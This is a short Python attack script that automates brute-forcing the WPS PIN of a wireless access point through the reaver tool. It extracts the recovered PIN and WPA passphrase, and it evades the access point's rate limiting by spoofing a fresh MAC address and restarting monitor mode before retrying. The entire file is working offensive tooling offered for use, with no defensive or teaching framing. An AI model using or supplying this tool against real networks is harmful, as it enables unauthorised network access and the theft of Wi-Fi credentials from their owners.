#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# WPS bruteforce + MAC address spoof
# pre alfa version

__author__ = '090h'
__license__ = 'GPL'

from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser
from os import path, devnull
from sys import argv, exit
from subprocess import Popen, PIPE, STDOUT
from pprint import pprint

from shared_utils.network import (
    random_mac,
    change_mac,
    discover_interfaces,
    start_monitor,
    stop_monitor,
)
from shared_utils.process import exec_cmd, run_interactive, program_exists


def reaver_exists():
    return program_exists('reaver')


def airmon_exists():
    return program_exists('airmon-ng')


def reaver(iface, bssid, mac, channel=None):
    res = {'pin': None, 'key': None, 'rate_limit': False, 'stdout': None}

    cmd = 'reaver -i %s -b %s -vv --mac=%s' % (iface, bssid, mac)
    if channel is not None:
        cmd += ' -c %s' % channel

    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line)
        print(line.strip())

        if line.find('Failed to initialize interface ') != -1:
            # print(line)
            exit(-1)

        # Automatic resume
        if line.find('[+] Restored previous session') != -1:
            p.stdin.write('Y\n')

        # [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
        if line.find("Detected AP rate limiting") != -1:
            res['rate_limit'] = True
            print('AP rate limit detected. Killing reaver...')
            p.kill()
            break
        # Check for PIN/PSK
        elif line.find("WPS PIN: '") != -1:
            res['pin'] = line[line.find("WPS PIN: '") + 10:-1]
        elif line.find("WPA PSK: '") != -1:
            res['key'] = line[line.find("WPA PSK: '") + 10:-1]

        if line == '' and p.poll() is not None:
            break

    res['stdout'] = ''.join(stdout)
    return res


def prepare_mon(iface):
    mac = change_mac(iface)
    print('Changed MAC on %s to %s' % (iface, mac))
    mon1, ifaces1 = discover_interfaces()
    # print('Mointors found:', mon1)
    start_monitor(iface)
    mon2, ifaces2 = discover_interfaces()
    # print('Mointors found:', mon2)
    mon = list(set(mon2) - set(mon1))
    if not mon:
        print('Error: no new monitor interface was created')
        exit(-1)
    mon = mon[0]
    # print('Delta mon', mon)
    return mon, mac


def reset_mon(iface, mon):
    stop_monitor(mon)
    return prepare_mon(iface)


def crack_wps(iface, bssid, channel=None, tries=3):
    mon, mac = prepare_mon(iface)

    while True:
        res = reaver(mon, bssid, mac, channel)
        pprint(res)
        if res['key'] is not None or res['pin'] is not None:
            print('Valid found!')
            break
        elif res['rate_limit']:
            if tries == 0:
                print('Tries exceeded.')
                break
            mon, mac = reset_mon(iface, mon)
            tries -= 1
        else:
            print('Unknown error. Reaver output:')
            pprint(res)
            break


if __name__ == '__main__':
    parser = ArgumentParser('reaver-spoof', description='reaver-wps + mac spoof')
    parser.add_argument('-i', '--interface', required=True, help='interface to use')
    parser.add_argument('-b', '--bssid', required=True, help='AP bssid')
    parser.add_argument('-c', '--channel', help='channel')
    parser.add_argument('-t', '--tries', type=int, default=3, help='tries')
    args = parser.parse_args()

    if 'channel' in args:
        crack_wps(args.interface, args.bssid, args.channel)
    else:
        crack_wps(args.interface, args.bssid)
